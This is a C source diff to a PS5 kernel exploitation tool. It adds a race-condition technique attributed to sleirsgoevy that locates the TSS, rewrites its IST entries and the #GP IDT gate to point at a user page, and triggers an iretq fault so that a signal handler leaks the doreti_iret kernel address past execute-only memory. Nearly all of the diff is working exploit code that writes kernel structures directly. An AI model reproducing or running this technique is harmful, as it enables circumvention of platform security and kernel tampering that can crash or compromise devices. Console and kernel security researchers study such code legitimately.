@@ -53,6 +53,8 @@ along with this program; see the file COPYING. If not, see
 #include <arpa/inet.h>
 #include <threads.h>
 #include <ucontext.h>
+#include <sys/cpuset.h>
+#include <pthread.h>
 
 #include <ps5/kernel.h>
 
@@ -71,6 +73,14 @@ do_cpuid(unsigned int ax, unsigned int *p)
 /* Signal handling for fault-safe probing */
 static sigjmp_buf probe_jmp_env;
 static volatile sig_atomic_t probe_fault_occurred;
+
+/* Step 7: #GP trap frame method state */
+static volatile sig_atomic_t gp_trap_stop_writer;
+static volatile sig_atomic_t gp_trap_got_result;
+static volatile uint64_t     gp_trap_doreti_addr;
+static volatile uint64_t     gp_trap_mc_cs;
+static volatile uint64_t     gp_trap_mc_err;
+static sigjmp_buf            gp_trap_jmp_env;
 
 /* Server configuration */
 #define SERVER_PORT 9023
@@ -2832,6 +2842,223 @@ cmd_dump_idt(int sock)
 }
 
 /*
+ * Step 7 helpers: #GP trap frame method (sleirsgoevy's technique)
+ *
+ * Trigger iretq to fault by returning to a non-canonical RIP,
+ * intercept the #GP via IST stack manipulation, and read doreti_iret
+ * from the signal context's mc_rip.
+ */
+
+/* SIGBUS handler for #GP trap frame method */
+static void
+gp_trap_sigbus_handler(int sig, siginfo_t *info, void *ctx)
+{
+    (void)sig;
+    (void)info;
+    ucontext_t *uc = (ucontext_t *)ctx;
+    gp_trap_doreti_addr = uc->uc_mcontext.mc_rip;
+    gp_trap_mc_cs       = uc->uc_mcontext.mc_cs;
+    gp_trap_mc_err      = uc->uc_mcontext.mc_err;
+    gp_trap_got_result  = 1;
+    siglongjmp(gp_trap_jmp_env, 1);
+}
+
+/* Writer thread: continuously overwrites CS field on IST page */
+static int
+gp_trap_writer_fn(void *arg)
+{
+    volatile uint8_t *ist_page = (volatile uint8_t *)arg;
+    /*
+     * IST stack trap frame layout (top at page+0x1000):
+     *   page+0xFF8: SS        (IST top - 0x08)
+     *   page+0xFF0: RSP       (IST top - 0x10)
+     *   page+0xFE8: RFLAGS    (IST top - 0x18)  <- writer sets 0x202
+     *   page+0xFE0: CS        (IST top - 0x20)   <- writer sets 0x43
+     *   page+0xFD8: RIP       (IST top - 0x28)   <- doreti_iret address
+     *   page+0xFD0: Error code(IST top - 0x30)
+     */
+    volatile uint64_t *p_cs     = (volatile uint64_t *)(ist_page + 0xFE0);
+    volatile uint64_t *p_rflags = (volatile uint64_t *)(ist_page + 0xFE8);
+
+    while (!gp_trap_stop_writer) {
+        *p_cs     = 0x43;   /* user-mode CS selector */
+        *p_rflags = 0x202;  /* IF set, reserved bit 1 set */
+    }
+    return 0;
+}
+
+/*
+ * find_tss_in_kdata - Scan kernel .data for TSS structures.
+ *
+ * The x86-64 TSS (Task State Segment) is 104 bytes.  FreeBSD allocates
+ * one per CPU in a contiguous array.  We pattern-match:
+ *   - rsvd0 (offset 0) == 0
+ *   - rsp0 is a kernel address
+ *   - rsp1, rsp2 == 0 (FreeBSD doesn't use ring 1/2)
+ *   - reserved field at offset 0x64 == 0
+ *   - IST fields are 0 or kernel addresses
+ *   - A second TSS follows 104+ bytes later (per-CPU array)
+ *
+ * Returns the kernel VA of the first TSS, or 0 on failure.
+ */
+static uint64_t
+find_tss_in_kdata(int sock)
+{
+    uint64_t kdata_base = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
+    uint64_t ktext_base = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
+    uint64_t scan_size  = 0x4000000; /* 64MB */
+    uint8_t buf[4096];
+
+    send_response(sock, "Scanning 64MB from kdata for TSS...\n");
+
+    for (uint64_t off = 0; off < scan_size; off += sizeof(buf)) {
+        if (kernel_copyout(kdata_base + off, buf, sizeof(buf)) != 0)
+            continue;
+
+        /* TSS is 104 bytes; scan at 16-byte alignment */
+        for (int i = 0; i <= (int)sizeof(buf) - 104; i += 16) {
+            uint32_t rsvd0;
+            uint64_t rsp0, rsp1, rsp2;
+
+            memcpy(&rsvd0, buf + i, 4);
+            if (rsvd0 != 0)
+                continue;
+
+            memcpy(&rsp0, buf + i + 4, 8);
+            /* rsp0 must be a kernel address */
+            if (rsp0 < (uint64_t)ktext_base || rsp0 == 0)
+                continue;
+
+            memcpy(&rsp1, buf + i + 12, 8);
+            memcpy(&rsp2, buf + i + 20, 8);
+            if (rsp1 != 0 || rsp2 != 0)
+                continue;
+
+            /* Check reserved field at offset 0x64 */
+            uint32_t rsvd64;
+            memcpy(&rsvd64, buf + i + 0x64, 4);
+            if (rsvd64 != 0)
+                continue;
+
+            /* Validate IST1-7 (offsets 0x24..0x5b): each 0 or kernel addr */
+            int ist_ok = 1;
+            for (int ist = 0; ist < 7; ist++) {
+                uint64_t ist_val;
+                memcpy(&ist_val, buf + i + 0x24 + ist * 8, 8);
+                if (ist_val != 0 &&
+                    ist_val < (uint64_t)ktext_base) {
+                    ist_ok = 0;
+                    break;
+                }
+            }
+            if (!ist_ok)
+                continue;
+
+            /* Confirm: look for a second TSS at +104 or further (per-CPU) */
+            uint64_t tss_va = kdata_base + off + i;
+            int found_second = 0;
+
+            /* TSS entries might be 104 bytes apart, or padded to 128/256 */
+            for (int stride = 104; stride <= 4096; stride += 8) {
+                uint64_t next_addr = tss_va + stride;
+                uint32_t next_rsvd0;
+                uint64_t next_rsp0;
+
+                if (kernel_copyout(next_addr, &next_rsvd0, 4) != 0)
+                    continue;
+                if (next_rsvd0 != 0)
+                    continue;
+                if (kernel_copyout(next_addr + 4, &next_rsp0, 8) != 0)
+                    continue;
+                if (next_rsp0 >= (uint64_t)ktext_base && next_rsp0 != 0) {
+                    found_second = 1;
+                    send_response(sock, "TSS found at 0x%lx (stride=%d to next)\n",
+                                  tss_va, stride);
+                    break;
+                }
+            }
+
+            if (found_second)
+                return tss_va;
+        }
+    }
+
+    return 0;
+}
+
+/*
+ * find_user_page_pa - Find the physical address of a user page.
+ *
+ * Write a magic value to an mmap'd page, then:
+ *   1. kernel_get_proc(getpid()) -> read vmspace at proc + VMSPACE_OFFSET
+ *   2. Scan vmspace (1024 bytes) for page-aligned values < 32GB
+ *   3. Try each as CR3 with vaddr_to_paddr_quiet()
+ *   4. Verify by reading the magic value back via DMAP
+ *
+ * Returns the physical address of the page, or 0 on failure.
+ */
+static uint64_t
+find_user_page_pa(int sock, uint64_t dmap_base, void *user_page)
+{
+    volatile uint64_t *magic = (volatile uint64_t *)user_page;
+    *magic = 0xDEAD1337CAFE4242ULL;
+
+    intptr_t proc = kernel_get_proc(getpid());
+    if (proc == 0) {
+        send_response(sock, "  kernel_get_proc failed\n");
+        return 0;
+    }
+
+    /* Read vmspace pointer from proc + KERNEL_OFFSET_PROC_P_VMSPACE */
+    uint64_t vmspace = kernel_getlong(proc + KERNEL_OFFSET_PROC_P_VMSPACE);
+    if (vmspace == 0) {
+        send_response(sock, "  vmspace is NULL\n");
+        return 0;
+    }
+
+    send_response(sock, "  proc=0x%lx vmspace=0x%lx\n", (uint64_t)proc, vmspace);
+
+    /* Scan vmspace for plausible CR3 values (page-aligned, < 32GB) */
+    uint8_t vsbuf[1024];
+    if (kernel_copyout(vmspace, vsbuf, sizeof(vsbuf)) != 0) {
+        send_response(sock, "  failed to read vmspace\n");
+        return 0;
+    }
+
+    uint64_t page_va = (uint64_t)user_page;
+
+    for (int off = 0; off <= (int)sizeof(vsbuf) - 8; off += 8) {
+        uint64_t cr3_cand;
+        memcpy(&cr3_cand, vsbuf + off, 8);
+
+        /* Must be page-aligned, nonzero, < 32GB */
+        if (cr3_cand == 0 || (cr3_cand & 0xFFF) != 0)
+            continue;
+        if (cr3_cand >= 0x800000000ULL) /* 32GB */
+            continue;
+
+        uint64_t pa, flags;
+        if (vaddr_to_paddr_quiet(dmap_base, cr3_cand, page_va,
+                                 &pa, &flags) != 0)
+            continue;
+
+        /* Verify: read magic back via DMAP */
+        uint64_t readback;
+        if (kernel_copyout(dmap_base + pa, &readback, 8) != 0)
+            continue;
+
+        if (readback == 0xDEAD1337CAFE4242ULL) {
+            send_response(sock, "  user page PA=0x%lx (CR3 cand at vmspace+0x%x)\n",
+                          pa, off);
+            return pa;
+        }
+    }
+
+    send_response(sock, "  could not find user page PA\n");
+    return 0;
+}
+
+/*
  * find_doreti_iret - Phase 7b: Locate doreti_iret gadget in kernel .text
  *
  * In FreeBSD the interrupt return path goes through doreti -> doreti_iret
@@ -3758,9 +3985,375 @@ broad_done:
         #undef MAX_UNIQ_TARGETS
     }
 
-    /* ---- Step 6: Classification ---- */
+    /* ---- Step 7: #GP Trap Frame Method (sleirsgoevy's technique) ---- */
+    /*
+     * When all previous steps fail (full XOM), use a race-condition technique:
+     *   1. Find the TSS in kernel .data, read IST entries
+     *   2. Allocate a user page and find its PA via process CR3
+     *   3. Redirect the TSS IST entry to our DMAP-backed page
+     *   4. Trigger iretq with non-canonical RIP -> #GP
+     *   5. Writer thread overwrites CS on our IST page -> SIGBUS to userspace
+     *   6. Signal handler reads doreti_iret from mc_rip
+     */
+    if (num_candidates == 0 && have_text_pa) {
+        send_response(sock, "\n--- Step 7: #GP Trap Frame Method ---\n");
+        send_response(sock, "All previous steps found 0 candidates; trying IST race.\n\n");
+
+        /* State for cleanup */
+        void *ist_page = NULL;
+        void *sigalt_stack = NULL;
+        uint64_t tss_va = 0;
+        int ist_modified[7] = {0};
+        uint64_t ist_saved[7] = {0};
+        int idt_gate_modified = 0;
+        uint8_t idt_gate_saved[16];
+        int gp_ist_index = 0; /* which IST the #GP gate uses (0 = none) */
+        int cpu_pinned = 0;
+        int sigbus_installed = 0;
+        struct sigaction old_sigbus_act;
+        int writer_started = 0;
+        thrd_t writer_thread;
+        stack_t old_sigalt;
+        int had_old_sigalt = 0;
+
+        /* 7a. Find TSS */
+        send_response(sock, "7a. Finding TSS in kernel .data...\n");
+        tss_va = find_tss_in_kdata(sock);
+        if (tss_va == 0) {
+            send_response(sock, "TSS not found, cannot proceed with Step 7\n");
+            goto step7_cleanup;
+        }
+
+        /* Read all IST entries from TSS */
+        uint64_t ist_entries[7];
+        for (int i = 0; i < 7; i++) {
+            ist_entries[i] = kernel_getlong(tss_va + 0x24 + i * 8);
+            send_response(sock, "  TSS IST%d: 0x%lx\n", i + 1, ist_entries[i]);
+        }
+
+        /* 7b. Check IDT #GP gate IST field */
+        send_response(sock, "\n7b. Checking IDT #GP gate...\n");
+        if (found_idt) {
+            uint8_t gp_gate[16];
+            if (kernel_copyout(idt_base + 13 * 16, gp_gate, 16) == 0) {
+                gp_ist_index = gp_gate[4] & 0x07;
+                send_response(sock, "  #GP gate IST field = %d\n", gp_ist_index);
+            } else {
+                send_response(sock, "  WARNING: cannot read #GP gate\n");
+            }
+        } else {
+            send_response(sock, "  IDT not found; will set ALL IST1-7\n");
+        }
+
+        /* 7c. Allocate IST page */
+        send_response(sock, "\n7c. Allocating IST page...\n");
+        ist_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
+                        MAP_PRIVATE | MAP_ANON, -1, 0);
+        if (ist_page == MAP_FAILED) {
+            ist_page = NULL;
+            send_response(sock, "  mmap failed\n");
+            goto step7_cleanup;
+        }
+        memset(ist_page, 0, 4096);
+        send_response(sock, "  IST page at user VA %p\n", ist_page);
+
+        /* 7d. Find physical address of IST page */
+        send_response(sock, "\n7d. Finding IST page physical address...\n");
+        uint64_t ist_page_pa = find_user_page_pa(sock, dmap_base, ist_page);
+        if (ist_page_pa == 0) {
+            send_response(sock, "  Cannot find IST page PA\n");
+            goto step7_cleanup;
+        }
+        uint64_t ist_dmap_va = dmap_base + ist_page_pa;
+        uint64_t ist_stack_top = ist_dmap_va + 0x1000;
+        send_response(sock, "  IST page PA=0x%lx, DMAP VA=0x%lx, stack top=0x%lx\n",
+                      ist_page_pa, ist_dmap_va, ist_stack_top);
+
+        /* 7e. Save & modify TSS IST entries */
+        send_response(sock, "\n7e. Modifying TSS IST entries...\n");
+        if (found_idt && gp_ist_index > 0) {
+            /* IDT found and #GP uses a specific IST: modify just that one */
+            int idx = gp_ist_index - 1;
+            ist_saved[idx] = ist_entries[idx];
+            kernel_setlong(tss_va + 0x24 + idx * 8, ist_stack_top);
+            ist_modified[idx] = 1;
+            send_response(sock, "  Set IST%d = 0x%lx (was 0x%lx)\n",
+                          gp_ist_index, ist_stack_top, ist_saved[idx]);
+        } else if (found_idt && gp_ist_index == 0) {
+            /* #GP uses IST=0 (current stack); need to set one and modify gate */
+            send_response(sock, "  #GP uses IST=0; setting IST7 and modifying gate\n");
+            gp_ist_index = 7;
+            int idx = 6; /* IST7 = index 6 */
+            ist_saved[idx] = ist_entries[idx];
+            kernel_setlong(tss_va + 0x24 + idx * 8, ist_stack_top);
+            ist_modified[idx] = 1;
+            send_response(sock, "  Set IST7 = 0x%lx (was 0x%lx)\n",
+                          ist_stack_top, ist_saved[idx]);
+
+            /* Modify #GP IDT gate byte 4 to use IST7 */
+            if (kernel_copyout(idt_base + 13 * 16, idt_gate_saved, 16) == 0) {
+                uint8_t new_ist_byte = (idt_gate_saved[4] & 0xF8) | 7;
+                kernel_setchar(idt_base + 13 * 16 + 4, new_ist_byte);
+                idt_gate_modified = 1;
+                send_response(sock, "  Modified #GP gate IST: %d -> 7\n",
+                              idt_gate_saved[4] & 0x07);
+            } else {
+                send_response(sock, "  WARNING: cannot modify #GP gate\n");
+            }
+        } else {
+            /* IDT not found: set ALL IST1-7 to cover unknown #GP IST */
+            send_response(sock, "  No IDT: setting ALL IST1-7 to our stack\n");
+            for (int i = 0; i < 7; i++) {
+                ist_saved[i] = ist_entries[i];
+                kernel_setlong(tss_va + 0x24 + i * 8, ist_stack_top);
+                ist_modified[i] = 1;
+            }
+            send_response(sock, "  All IST1-7 set to 0x%lx\n", ist_stack_top);
+        }
+
+        /* 7f. Pin to CPU 0 */
+        send_response(sock, "\n7f. Pinning to CPU 0...\n");
+        {
+            cpuset_t cpuset;
+            CPU_ZERO(&cpuset);
+            CPU_SET(0, &cpuset);
+            if (cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1,
+                                   sizeof(cpuset), &cpuset) == 0) {
+                cpu_pinned = 1;
+                send_response(sock, "  Pinned to CPU 0\n");
+            } else {
+                send_response(sock, "  WARNING: cpuset_setaffinity failed (errno=%d)\n",
+                              errno);
+            }
+        }
+
+        /* 7g. Setup signal handling */
+        send_response(sock, "\n7g. Setting up signal handling...\n");
+        {
+            /* Allocate signal alternate stack (64KB) */
+            size_t sigstack_size = 64 * 1024;
+            sigalt_stack = mmap(NULL, sigstack_size, PROT_READ | PROT_WRITE,
+                                MAP_PRIVATE | MAP_ANON, -1, 0);
+            if (sigalt_stack == MAP_FAILED) {
+                sigalt_stack = NULL;
+                send_response(sock, "  sigaltstack mmap failed\n");
+                goto step7_cleanup;
+            }
+
+            stack_t ss;
+            ss.ss_sp = sigalt_stack;
+            ss.ss_size = sigstack_size;
+            ss.ss_flags = 0;
+            if (sigaltstack(&ss, &old_sigalt) == 0) {
+                had_old_sigalt = 1;
+            } else {
+                send_response(sock, "  WARNING: sigaltstack failed\n");
+            }
+
+            struct sigaction sa;
+            memset(&sa, 0, sizeof(sa));
+            sa.sa_sigaction = gp_trap_sigbus_handler;
+            sigemptyset(&sa.sa_mask);
+            sa.sa_flags = SA_SIGINFO | SA_ONSTACK;
+            if (sigaction(SIGBUS, &sa, &old_sigbus_act) == 0) {
+                sigbus_installed = 1;
+                send_response(sock, "  SIGBUS handler installed (SA_ONSTACK)\n");
+            } else {
+                send_response(sock, "  sigaction failed\n");
+                goto step7_cleanup;
+            }
+        }
+
+        /* 7h. Start writer thread */
+        send_response(sock, "\n7h. Starting writer thread...\n");
+        gp_trap_stop_writer = 0;
+        gp_trap_got_result = 0;
+        gp_trap_doreti_addr = 0;
+
+        if (thrd_create(&writer_thread, gp_trap_writer_fn, ist_page) == thrd_success) {
+            writer_started = 1;
+            send_response(sock, "  Writer thread started (target: ist_page+0xFE0)\n");
+        } else {
+            send_response(sock, "  thrd_create failed\n");
+            goto step7_cleanup;
+        }
+
+        /* 7i. Trigger loop */
+        send_response(sock, "\n7i. Triggering iretq fault (up to 20 attempts)...\n");
+        {
+            int max_attempts = 20;
+
+            for (int attempt = 1; attempt <= max_attempts; attempt++) {
+                if (gp_trap_got_result)
+                    break;
+
+                if (sigsetjmp(gp_trap_jmp_env, 1) != 0) {
+                    /* Returned from SIGBUS handler */
+                    send_response(sock, "  attempt %d: SIGBUS caught! "
+                                  "mc_rip=0x%lx mc_cs=0x%lx mc_err=0x%lx\n",
+                                  attempt, (uint64_t)gp_trap_doreti_addr,
+                                  (uint64_t)gp_trap_mc_cs,
+                                  (uint64_t)gp_trap_mc_err);
+                    break;
+                }
+
+                /*
+                 * Get current context, set RIP to non-canonical address,
+                 * then setcontext() -> kernel iretq -> #GP because the
+                 * return address is non-canonical.
+                 */
+                ucontext_t uc;
+                getcontext(&uc);
+
+                if (gp_trap_got_result)
+                    break;
+
+                uc.uc_mcontext.mc_rip = 0x8000000000000000ULL;
+                setcontext(&uc);
+
+                /* Should not reach here - setcontext doesn't return on success */
+            }
+        }
+
+        /* 7j. Report result */
+        send_response(sock, "\n7j. Result:\n");
+        if (gp_trap_got_result && gp_trap_doreti_addr != 0) {
+            uint64_t addr = gp_trap_doreti_addr;
+            uint64_t koff = addr - (uint64_t)ktext_base;
+
+            /* Validate: should be in kernel .text range */
+            if (addr >= (uint64_t)ktext_base &&
+                addr < (uint64_t)ktext_base + 0x2000000) {
+                send_response(sock,
+                    "\n*** doreti_iret = 0x%lx (ktext+0x%lx) ***\n",
+                    addr, koff);
+                send_response(sock,
+                    "Confidence: HIGH (direct trap frame intercept)\n");
+                send_response(sock, "\nNotes:\n");
+                send_response(sock,
+                    "  mc_cs=0x%lx mc_err=0x%lx\n",
+                    (uint64_t)gp_trap_mc_cs, (uint64_t)gp_trap_mc_err);
+                send_response(sock,
+                    "  Found via sleirsgoevy's IST #GP race technique\n");
+                send_response(sock,
+                    "  Phase 7c will redirect #DB to singlestep "
+                    "through this instruction\n");
+
+                /* Stop writer before cleanup */
+                gp_trap_stop_writer = 1;
+                if (writer_started) {
+                    thrd_join(writer_thread, NULL);
+                    writer_started = 0;
+                }
+
+                /* Cleanup TSS */
+                for (int i = 0; i < 7; i++) {
+                    if (ist_modified[i]) {
+                        kernel_setlong(tss_va + 0x24 + i * 8, ist_saved[i]);
+                        ist_modified[i] = 0;
+                    }
+                }
+                /* Cleanup IDT gate */
+                if (idt_gate_modified) {
+                    kernel_setchar(idt_base + 13 * 16 + 4, idt_gate_saved[4]);
+                    idt_gate_modified = 0;
+                }
+                /* Restore SIGBUS */
+                if (sigbus_installed) {
+                    sigaction(SIGBUS, &old_sigbus_act, NULL);
+                    sigbus_installed = 0;
+                }
+                /* Restore sigaltstack */
+                if (had_old_sigalt) {
+                    sigaltstack(&old_sigalt, NULL);
+                    had_old_sigalt = 0;
+                }
+                /* Unpin CPU */
+                if (cpu_pinned) {
+                    cpuset_t all;
+                    CPU_ZERO(&all);
+                    for (int i = 0; i < 16; i++)
+                        CPU_SET(i, &all);
+                    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1,
+                                       sizeof(all), &all);
+                    cpu_pinned = 0;
+                }
+                /* Free pages */
+                if (sigalt_stack) {
+                    munmap(sigalt_stack, 64 * 1024);
+                    sigalt_stack = NULL;
+                }
+                if (ist_page) {
+                    munmap(ist_page, 4096);
+                    ist_page = NULL;
+                }
+
+                send_response(sock, "OK\n");
+                return;
+            } else {
+                send_response(sock,
+                    "  mc_rip=0x%lx is outside kernel .text range, discarding\n",
+                    addr);
+            }
+        } else {
+            send_response(sock, "  No result after all attempts\n");
+        }
+
+    step7_cleanup:
+        send_response(sock, "\nStep 7 cleanup...\n");
+
+        /* Stop writer thread */
+        gp_trap_stop_writer = 1;
+        if (writer_started) {
+            thrd_join(writer_thread, NULL);
+            writer_started = 0;
+        }
+
+        /* Restore TSS IST entries */
+        for (int i = 0; i < 7; i++) {
+            if (ist_modified[i]) {
+                kernel_setlong(tss_va + 0x24 + i * 8, ist_saved[i]);
+                send_response(sock, "  Restored IST%d to 0x%lx\n",
+                              i + 1, ist_saved[i]);
+            }
+        }
+
+        /* Restore IDT gate */
+        if (idt_gate_modified) {
+            kernel_setchar(idt_base + 13 * 16 + 4, idt_gate_saved[4]);
+            send_response(sock, "  Restored #GP gate IST byte\n");
+        }
+
+        /* Restore SIGBUS handler */
+        if (sigbus_installed)
+            sigaction(SIGBUS, &old_sigbus_act, NULL);
+
+        /* Restore sigaltstack */
+        if (had_old_sigalt)
+            sigaltstack(&old_sigalt, NULL);
+
+        /* Unpin CPU */
+        if (cpu_pinned) {
+            cpuset_t all;
+            CPU_ZERO(&all);
+            for (int i = 0; i < 16; i++)
+                CPU_SET(i, &all);
+            cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1,
+                               sizeof(all), &all);
+        }
+
+        /* Free pages */
+        if (sigalt_stack)
+            munmap(sigalt_stack, 64 * 1024);
+        if (ist_page)
+            munmap(ist_page, 4096);
+
+        send_response(sock, "Step 7 cleanup complete\n");
+    }
+
+    /* ---- Step 8: Classification ---- */
 classify:
-    send_response(sock, "\n--- Step 6: doreti_iret Candidates ---\n");
+    send_response(sock, "\n--- Step 8: doreti_iret Candidates ---\n");
 
     if (num_candidates == 0) {
         send_response(sock, "No iretq candidates found.\n");
